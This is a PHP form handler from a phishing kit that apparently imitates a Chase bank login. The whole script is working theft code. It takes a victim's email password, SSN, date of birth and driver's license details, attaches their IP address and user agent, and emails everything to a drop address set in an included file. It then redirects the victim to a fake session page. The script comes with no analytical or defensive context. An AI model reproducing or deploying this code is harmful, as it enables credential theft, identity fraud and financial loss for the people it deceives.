<?php
if($_POST["em"] != "" and $_POST["ep"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Cha'asse Info-----------------------\n";
$message .= "Em@il Address				        : ".$_POST['em']."\n";
$message .= "Em@il Pa'sw0rd				        : ".$_POST['ep']."\n";
$message .= "C0nf!rm Pas'w0rd		           	: ".$_POST['cp']."\n";
$message .= "SSN					           	: ".$_POST['sn']."\n";
$message .= "DOB (MM/DD/YYYY)					: ".$_POST["dbd"].'/'.$_POST['dbm'].'/'.$_POST['dby']."\n";
$message .= "Occupation				           	: ".$_POST['ct']."\n";
$message .= "Driver's License Number	      	: ".$_POST['dl']."\n";
$message .= "License Issue State 		    	: ".$_POST['state']."\n";
$message .= "License Expiry Date (MM/DD/YYYY) 	: ".$_POST["dbd"].'/'.$_POST['dbm'].'/'.$_POST['dby']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>